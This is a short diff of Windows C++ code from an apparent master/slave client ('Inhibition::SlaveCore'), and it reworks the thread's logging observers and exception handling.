@@ -62,7 +62,7 @@ DWORD WINAPI run(void)
 	{
 		LOG.setHeader("SLAVE");
 		LOG.addObserver(new Common::LogToConsole);
-		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+		LOG.addObserver(new Common::LogToCollector);
 		ConnectionInfo info = getConnectionInfo();	    
 		
 		Inhibition::SlaveCore slave(info);
@@ -88,14 +88,10 @@ DWORD WINAPI run(void)
 			}
 		}
 	}
-	catch(std::exception& e)
+	catch(Common::Exception&)
 	{
-		LOG << e.what();
 	}
-	catch(...)
-	{
-		LOG << "Unknown exception";
-	}
+	CATCH_UNKNOWN_EXCEPTION
 	
     System::Process::This thisProcess;
 	thisProcess.killHierarchy();
